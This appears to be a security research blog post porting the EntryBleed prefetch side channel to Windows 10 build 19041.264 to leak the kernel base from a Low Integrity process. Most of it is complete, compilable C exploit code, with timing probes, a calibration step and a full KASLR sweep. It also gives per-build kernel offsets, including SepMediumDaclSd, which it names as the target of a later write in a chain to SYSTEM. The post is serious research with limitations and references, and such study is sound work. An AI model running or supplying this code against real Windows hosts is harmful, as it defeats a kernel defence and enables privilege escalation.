---
title: "EntryBleed on Windows: Breaking KASLR From Low Integrity, No Debugger Required"
date: 2026-07-14
draft: false
tags:
  - Windows
  - Vulnerability Research
  - KASLR
  - Side-Channel
  - Kernel Exploitation
  - Reverse Engineering
description: "Porting the Linux EntryBleed prefetch timing attack (CVE-2022-4543) to Windows 10 20H1, by finding the KVA Shadow trampoline that plays the same structural role as entry_SYSCALL_64, and turning it into a reliable, debugger-free kernel base leak for a full Low-IL to SYSTEM chain."
---

## Introduction

Every privilege escalation chain that ends by writing to a specific kernel structure eventually runs into the same wall: you need to know where the kernel is. KASLR randomizes `ntoskrnl.exe`'s base on every boot, and without it an offset like "`SepMediumDaclSd` is at RVA `0xD2D3B8`" is useless, since there's nothing yet to add it to.

The easy way out is a debugger. `dq nt!SepMediumDaclSd` in WinDbg gives the answer in one line. But a real exploit chain, one meant to run unattended from an unprivileged, Low Integrity process, doesn't get that shortcut. It has to work out where the kernel is using only what a Low IL process can already touch.

This is a writeup of how we did that, by porting EntryBleed (CVE-2022-4543), a prefetch timing side channel originally published against Linux, to Windows 10 20H1, build 19041.264. Not a loose "same idea" port either. The same underlying architectural bug shows up in a Windows structure that plays the identical role to the one EntryBleed targeted on Linux, and that correspondence is what makes the port reliable instead of a lucky guess that happened to work once.

## Background: what EntryBleed actually breaks

Kernel Page Table Isolation (KPTI) exists because of Meltdown. Before Meltdown, every process's page tables mapped the entire kernel address space, just with the supervisor bit set so user code couldn't read it, which is cheap, since nothing has to change in CR3 to move between user and kernel code. Meltdown broke that assumption, because speculative execution could read supervisor only pages anyway, and cache timing extracted the result afterward. KPTI's fix is to stop mapping the kernel into user page tables at all, with one exception: the CPU needs something mapped in both address spaces just to begin handling a syscall or interrupt, because the instruction pointer is still running under the old CR3 for the first few cycles of the transition.

Linux's answer is the entry trampoline, a minimal stub containing `entry_SYSCALL_64`'s prologue, mapped at the same virtual address in both the restricted user page tables and the full kernel page tables, just long enough to switch CR3 and jump into the real, isolated kernel. Will Song's EntryBleed writeup pointed out the consequence nobody had exploited yet: that page is now the only piece of the randomized kernel image guaranteed to be resident in the current process's page tables and TLB. Detect whether a specific virtual address is currently cached, and KASLR is broken without ever reading kernel memory.

The detection primitive is prefetch timing, from Gruss et al.'s 2016 CCS paper "Prefetch Side-Channel Attacks: Bypassing SMAP and Kernel ASLR", which had already broken Windows 10's KASLR years before Meltdown existed, back when the kernel was unconditionally mapped everywhere and the technique targeted different, unisolated structures. EntryBleed's contribution wasn't inventing prefetch timing, it was noticing that KPTI, built to fix an unrelated bug, reopened the same door on Linux through one specific, always resident page. Force `entry_SYSCALL_64`'s page into the TLB with a real syscall, then `prefetch` and `rdtscp` across the range of possible kernel bases. The correct guess resolves in cache hit time, every wrong one pays for a page walk. The original writeup reports near perfect accuracy averaging 100 iterations per candidate, across several Intel CPUs and kernel versions.

## This isn't really a Linux bug

What made this worth porting, rather than just admiring from a distance, is that the root cause has nothing to do with Linux specifically. Any KPTI style mitigation runs into the identical constraint: the CPU can't atomically switch both the instruction pointer and CR3, so some code has to sit resident on both sides of the isolation boundary. That residency is unavoidable, and it's an oracle the moment it exists.

Windows shipped its own Meltdown mitigation, KVA Shadow, starting with the April 2018 update, later reverse engineered in public by researchers including Alex Ionescu. It works the same way conceptually. A dedicated `.KVASCODE` section inside `ntoskrnl.exe` holds "Shadow" variants of the low level trap, interrupt, and syscall dispatch routines, `KiSystemCall64Shadow` being the syscall one, and that section, only that section, stays mapped in the restricted, user visible page tables. It backs up the user stack pointer, swaps in the real kernel `CR3` from `_KPRCB.KernelDirectoryTableBase`, and only then jumps into the fully isolated kernel.

That's the same trade-off Linux made, in a different section, under a different name. If EntryBleed's underlying insight holds regardless of OS, it should work against `.KVASCODE` too.

## Finding the right anchor

The sweep needs one known good RVA inside the resident region to use as a timing anchor, everything else is just `candidate_base + that_RVA`. Get the anchor wrong and nothing crashes, the sweep just measures noise and reports nothing usable.

The first thing tried, `nt!KiSystemServiceCopyEnd`, looked promising mostly because it had already turned up in a stack trace earlier in this same investigation, so it was a name already halfway trusted. Measured against the real, WinDbg confirmed kernel base, it came back at 70 cycles, the same as the median of the clearly unmapped candidates elsewhere in the sweep. Resolving in a public symbol server doesn't mean a routine lives in the resident shadow region. Most of `ntoskrnl.exe`, including plenty of code sitting right next to the syscall path, simply doesn't.

So the search stopped going by symbol names it happened to recognize and went structural instead. The `.KVASCODE` section groups every shadow trampoline together, and Microsoft's own naming keeps that grouping visible without needing source: every trap, interrupt, and syscall handler that has a shadow copy carries a `Shadow` suffix on that copy. Running

```
x nt!*Shadow*
```

in WinDbg, public symbols resolve fine for `ntoskrnl.exe` on this build, returns a tight cluster about 8KB wide, which is itself a useful signal: that's the footprint of a dedicated, deliberately small code section rather than a coincidence of naming. `nt!KiSystemCall64Shadow` sits inside that cluster, at RVA `0xA23180` on this particular build. That became the anchor.

```c
/* Per-build constants (19041.264) */
#define DEFAULT_RVA_ANCHOR 0xA23180    /* nt!KiSystemCall64Shadow */
#define DEFAULT_RVA_SEPSD  0xD2D3B8    /* nt!SepMediumDaclSd */
```

Both numbers are only good for 19041.264. A different build, even a different patch level of the same 20H1 branch, can move `.KVASCODE` around, and would need the same `x nt!*Shadow*` search run again against that build's own symbols before either constant gets reused. Nothing about the method itself is build specific. Only these two numbers are, which is worth flagging for anyone tempted to hardcode them against a different image.

## Prefetch, fenced on both sides

Everything from here on lives in one plain C file. Four headers cover the whole thing: `windows.h` for `VirtualAlloc` and the thread affinity calls, `intrin.h` for `_mm_prefetch`, `_mm_mfence`, `_mm_lfence` and `__rdtscp`, and `stdint.h`/`stdlib.h` for `uintptr_t`, `malloc` and `qsort`.

```c
#include <windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
```

The measurement itself stays small on purpose. `mfence` before the first timestamp keeps earlier memory traffic from bleeding into the window, and `lfence` around the prefetch stops out of order execution from reordering the timestamp reads relative to it. This is the fencing Intel's own benchmarking guidance recommends for `rdtscp` based timing, and it matters here because a single misordered instruction is enough to erase a signal that's only a handful of cycles wide to begin with.

```c
static unsigned __int64 ProbeOnce(volatile void *addr) {
    unsigned int aux;
    unsigned __int64 t0, t1;
    _mm_mfence();
    t0 = __rdtscp(&aux);
    _mm_lfence();
    __try { _mm_prefetch((char const *)addr, _MM_HINT_T0); }
    __except (EXCEPTION_EXECUTE_HANDLER) { }
    _mm_lfence();
    t1 = __rdtscp(&aux);
    return t1 - t0;
}
```

The `__try`/`__except` around the prefetch is belt and suspenders, not actually load bearing. `PREFETCHh` is architecturally guaranteed never to fault, even against a completely invalid address, it just degrades to a no-op. That's what makes sweeping tens of thousands of candidate kernel addresses safe from an unprivileged process in the first place. A wrong guess produces a slightly slower measurement and nothing else. There's nothing for the kernel to notice.

Each candidate gets measured 32 times, and only the minimum is kept. Cache noise can only push a timing up, never down, so the fastest of several tries sits closest to the address's real resident or non-resident timing.

```c
static unsigned __int64 TimeOne(volatile void *addr, int reps) {
    unsigned __int64 best = (unsigned __int64)-1;
    for (int i = 0; i < reps; i++) {
        unsigned __int64 d = ProbeOnce(addr);
        if (d < best) best = d;
    }
    return best;
}
```

## Calibrating before touching the kernel at all

Before the sweep goes near a kernel address, it answers a smaller question first: does this host and hypervisor even produce a measurable prefetch timing gap to begin with. That gets checked entirely in user space, timing a `VirtualAlloc`'d, committed page against a merely reserved one, same mechanism, zero kernel risk either way. If a committed page and a reserved page can't be told apart on a given machine, there's no reason to expect a cleaner signal out of 16,000 kernel guesses.

This reuses `ProbeOnce` and `TimeOne` from above against two addresses inside memory the process already owns: one page reserved and then committed and touched, so it's genuinely resident, and a second page deep inside the same reservation that's left reserved only, so it's genuinely absent from the page tables, with no risk of colliding with anything unrelated since both live inside one range the process controls end to end.

```c
static int CmpU64(const void *a, const void *b) {
    unsigned __int64 x = *(const unsigned __int64 *)a, y = *(const unsigned __int64 *)b;
    return (x > y) - (x < y);
}

static unsigned __int64 Median(unsigned __int64 *samples, int n) {
    qsort(samples, n, sizeof(unsigned __int64), CmpU64);
    return samples[n / 2];
}

static void CalibrationCheck(void) {
    const int trials = 20000, reps = 16, warmup = 2000;

    SIZE_T regionSize = 0x100000;   /* 1MB, reserved only to start with */
    LPVOID region = VirtualAlloc(NULL, regionSize, MEM_RESERVE, PAGE_NOACCESS);

    LPVOID mappedPage = VirtualAlloc(region, 0x1000, MEM_COMMIT, PAGE_READWRITE);
    volatile unsigned char *mapped = (volatile unsigned char *)mappedPage;
    mapped[0] = 0x41;   /* touch it, so it's genuinely resident, not just committed */

    /* Never committed, but still a VA the process owns. */
    volatile unsigned char *unmapped =
        (volatile unsigned char *)((uintptr_t)region + regionSize - 0x1000);

    SetThreadAffinityMask(GetCurrentThread(), 1);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    unsigned __int64 *mappedT = (unsigned __int64 *)malloc(sizeof(unsigned __int64) * trials);
    unsigned __int64 *unmapT  = (unsigned __int64 *)malloc(sizeof(unsigned __int64) * trials);

    for (int i = 0; i < warmup; i++) { ProbeOnce(mapped); ProbeOnce(unmapped); }
    for (int i = 0; i < trials; i++) {
        /* interleaved, so hypervisor jitter and frequency scaling hit both sides evenly */
        mappedT[i] = TimeOne(mapped, reps);
        unmapT[i]  = TimeOne(unmapped, reps);
    }

    unsigned __int64 medMapped = Median(mappedT, trials);
    unsigned __int64 medUnmap  = Median(unmapT, trials);
    printf("mapped median = %llu cycles, unmapped median = %llu cycles, gap = %llu\n",
           medMapped, medUnmap, medUnmap - medMapped);

    free(mappedT); free(unmapT);
    VirtualFree(region, 0, MEM_RELEASE);
}
```

A wide, repeatable gap between the two medians means this host is worth pointing at kernel addresses. A gap close to zero, or one that moves around between runs, means it isn't, and the sweep further down should not be trusted on that machine no matter how clean its own output looks.

## The sweep itself

`ntoskrnl.exe` on x64 always loads 2MB aligned, so the search space is a stride `0x200000` sweep across the range Windows draws kernel bases from:

```c
#define DEFAULT_SWEEP_LO   0xFFFFF80000000000ULL
#define DEFAULT_SWEEP_HI   0xFFFFF807FFFFFFFFULL
#define DEFAULT_SWEEP_STEP 0x200000
#define DEFAULT_REPS       32
#define WARMUP             1000
```

That range divided by the step is a little over 16,000 candidate bases, each timed 32 times, after a 1,000 iteration warmup against the low end of the range so the branch predictor and TLB settle into a steady state before any measurement actually counts.

Two more pieces are needed before the sweep function itself: something to hold a candidate base together with its timing, and a comparator so the results can be sorted by how fast they came back.

```c
#define MIN_OUTLIER_GAP_FROM_MEDIAN 6.0
#define MIN_OUTLIER_GAP_FROM_SECOND 2.0

typedef struct { uintptr_t base; unsigned __int64 timing; } Candidate;

static int CmpCandidate(const void *a, const void *b) {
    const Candidate *ca = (const Candidate *)a, *cb = (const Candidate *)b;
    if (ca->timing < cb->timing) return -1;
    if (ca->timing > cb->timing) return 1;
    return 0;
}
```

That's everything the sweep itself needs:

```c
static uintptr_t RecoverNtBase(uintptr_t rvaAnchor, uintptr_t lo, uintptr_t hi,
                                uintptr_t step, int reps) {
    SetThreadAffinityMask(GetCurrentThread(), 1);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    unsigned __int64 candidateCount = (hi - lo) / step + 1;
    Candidate *results = (Candidate *)malloc(sizeof(Candidate) * (size_t)candidateCount);
    if (!results) return 0;

    for (int i = 0; i < WARMUP; i++) ProbeOnce((volatile void *)lo);

    unsigned __int64 idx = 0;
    for (uintptr_t base = lo; base <= hi; base += step) {
        volatile void *addr = (volatile void *)(base + rvaAnchor);
        results[idx].base = base;
        results[idx].timing = TimeOne(addr, reps);
        idx++;
        if (base + step < base) break;   /* overflow guard at the top of the range */
    }
    qsort(results, (size_t)idx, sizeof(Candidate), CmpCandidate);

    unsigned __int64 minVal    = results[0].timing;
    unsigned __int64 secondVal = (idx > 1) ? results[1].timing : minVal;
    uintptr_t        minBase   = results[0].base;
    double median         = (double)results[idx / 2].timing;
    double gapFromMedian  = median - (double)minVal;
    double gapFromSecond  = (double)secondVal - (double)minVal;
    free(results);

    if (gapFromMedian < MIN_OUTLIER_GAP_FROM_MEDIAN ||
        gapFromSecond  < MIN_OUTLIER_GAP_FROM_SECOND)
        return 0;   /* not confident, caller retries, nothing kernel side was touched */

    return minBase;
}
```

Pinning the thread to one logical CPU and raising it to `THREAD_PRIORITY_TIME_CRITICAL` keeps scheduler noise from smearing a signal this thin. The winning candidate still has to clear two separate bars before it's trusted: a minimum gap below the median of the whole sweep, so it's a genuine outlier and not noise around the floor, and a minimum gap below the second fastest candidate, so it's a clean single winner rather than two candidates tied within measurement error. Miss either bar and the function returns 0 instead of guessing. No kernel memory gets touched by a failed attempt either way, so the caller just sweeps again.

Tying it to a `main` is deliberately anticlimactic, which is rather the point of the whole exercise:

```c
int main(void) {
    uintptr_t base = RecoverNtBase(DEFAULT_RVA_ANCHOR, DEFAULT_SWEEP_LO,
                                    DEFAULT_SWEEP_HI, DEFAULT_SWEEP_STEP, DEFAULT_REPS);
    if (!base) {
        printf("[-] sweep wasn't confident, run it again\n");
        return 1;
    }
    printf("[+] nt base           = 0x%p\n", (void *)base);
    printf("[+] SepMediumDaclSd    = 0x%p\n", (void *)(base + DEFAULT_RVA_SEPSD));
    return 0;
}
```

Built the ordinary way, no special flags beyond optimization:

```
cl /nologo /O2 entrybleed.c /Fe:entrybleed.exe
```

## Validating the result three times, not once

Agreeing with WinDbg a single time could still be a coincidence, so the sweep got checked at three levels, each less forgiving than the last.

First, against a known address. With the real base already pulled from WinDbg for that boot, the anchor RVA was timed directly against it and against nearby wrong guesses, just to confirm the gap exists and is large enough to use before trusting anything automated.

Second, a full blind sweep on that same boot. The complete, roughly 16,000 candidate run, with the tool given no hint, checked afterward against the WinDbg value already in hand. It matched.

Third, the one that actually matters: reboot the VM so KASLR reshuffles, run the sweep with genuinely no prior knowledge of the new base, and only pull up WinDbg afterward to check. It landed on the same address WinDbg reported for that new boot.

Only after all three did the sweep get wired into the rest of the chain as the source of truth for the kernel base, with no debugger attached during the run itself.

## Where it doesn't work

The technique doesn't converge on every CPU, and that's worth laying out plainly instead of only listing the successes.

| Processor | Microarchitecture | Cores / threads | Hypervisor | Result |
|---|---|---|---|---|
| Intel Core i5-4590 | Haswell | 4C / 4T | VirtualBox, VMware | Converges |
| Intel Core i7-6500 | Skylake | 2C / 4T | VirtualBox, VMware | Converges |
| Intel Core Ultra 9 185H | Meteor Lake | 16C / 22T | VMware | Converges |
| Intel Core Ultra 9 285H | Arrow Lake | 16C / 16T | VMware | Does not converge |

All VMs were configured with 2 virtual CPUs.

The obvious pattern is that the only chip without Hyper-Threading among the last two rows is also the only one that fails, and Hyper-Threading changes how cache and TLB entries get shared and evicted at the core level, exactly what a prefetch timing channel is measuring. That was the first hypothesis, and it doesn't fully survive contact with the rest of the table: the i5-4590 has no Hyper-Threading either, and it converges without any trouble. So the presence or absence of SMT alone doesn't cleanly separate every working host from the one that fails. What actually changed between Meteor Lake and Arrow Lake is bigger than just dropping Hyper-Threading, a redesigned P-core and E-core pairing, Lion Cove and Skymont instead of Redwood Cove and Crestmont, and a different cache hierarchy that comes with it. This project didn't have a second Hyper-Threading-less hybrid chip on hand to isolate which of those actually matters. What's solid is the boundary itself, not yet the mechanism behind it.

There's also a question this project left open rather than answered: on the 285H, the full kernel sweep didn't converge, but `CalibrationCheck` from earlier, the one that only ever touches memory the process owns, was never run and logged specifically against that chip on its own. The outlier thresholds in `RecoverNtBase`, 6 cycles from the median, 2 from the runner-up, were set once, against hosts where the mapped versus unmapped gap came back wide and obvious, and never retuned per chip. If Arrow Lake's cache and TLB hierarchy still produces some separation, just a narrower one than Meteor Lake's, more repetitions per candidate and looser thresholds might recover it. If `CalibrationCheck` would come back flat on that chip even on its own memory, no amount of retuning downstream saves it, since there would be no gap left to detect in the first place. Which of those two is true for the 285H is not known. It just wasn't tested, and raising `-retries` alone would not distinguish between them, since retrying the same measurement with the same thresholds tells you nothing about whether a smaller gap exists that those thresholds are simply too strict to see.

None of this affects anything built on top of this stage. Whatever needs a kernel base runs exactly the same way afterward, regardless of how that base was obtained.

## Not depending on it blindly

A side channel that depends on hardware outside your control needs an escape hatch, so anything built on top of it doesn't inherit that dependency. The `main` above is deliberately bare, but the two knobs worth adding to it in any real use are the same two this project relies on: a retry budget, since a single inconclusive sweep is usually just noise,

```
entrybleed.exe -retries 30
```

and a direct override for the one case retries can't fix, a hardware limit like the one in the table above. Skip the sweep entirely and hand `RecoverNtBase`'s caller the base straight from WinDbg instead:

```
entrybleed.exe -base 0xFFFFF80123456000
```

Either path ends up with the same trusted base in hand, and whatever runs after this stage behaves identically no matter which of the two produced it. The timing side channel is a convenience for the fully autonomous, no debugger case, not a dependency the rest of a chain should be built on top of.

## What it hands off

Once `RecoverNtBase` returns a trusted base, any RVA on this build turns into a real, absolute kernel address by plain addition, the `SepMediumDaclSd` example from the introduction included: `base + 0xD2D3B8`. That's the entire job of this stage, nothing more. It never reads or writes a single byte of kernel memory itself, it only answers where the kernel is, using nothing but a clock, and it answers that question the same way architecturally whether the syscall on the other end belongs to Linux or Windows.

## Closing

EntryBleed was never a Linux specific bug so much as a consequence of what any Meltdown mitigation is forced to do: leave one small, structurally necessary trampoline resident on both sides of an isolation boundary it otherwise enforces completely. Linux's version of that trampoline is `entry_SYSCALL_64`. Windows keeps its own inside `.KVASCODE`, in `KiSystemCall64Shadow`. Porting the attack mostly meant taking the original writeup at its word that the bug was architectural, then going looking, by structure rather than by guessing at symbol names, for the one place on Windows where the same compromise had to exist.

## References

- [EntryBleed: Breaking KASLR under KPTI with Prefetch (CVE-2022-4543)](https://www.willsroot.io/2022/12/entrybleed.html), Will (willsroot.io), 2022.
- [oss-security: CVE-2022-4543, KASLR Leakage Achievable even with KPTI through Prefetch Side-Channel](https://www.openwall.com/lists/oss-security/2022/12/16/3)
- Daniel Gruss, Clementine Maurice, Andreas Fogh, Moritz Lipp, Stefan Mangard, "Prefetch Side-Channel Attacks: Bypassing SMAP and Kernel ASLR", ACM CCS 2016.
- [KVA Shadow: Mitigating Meltdown on Windows](https://msrc-blog.microsoft.com/2018/03/23/kva-shadow-mitigating-meltdown-on-windows/), Microsoft Security Response Center, 2018.
- [A Deep Dive Analysis of Microsoft's Kernel Virtual Address Shadow Feature](https://www.fortinet.com/blog/threat-research/a-deep-dive-analysis-of-microsoft-s-kernel-virtual-address-shadow-feature), Fortinet.
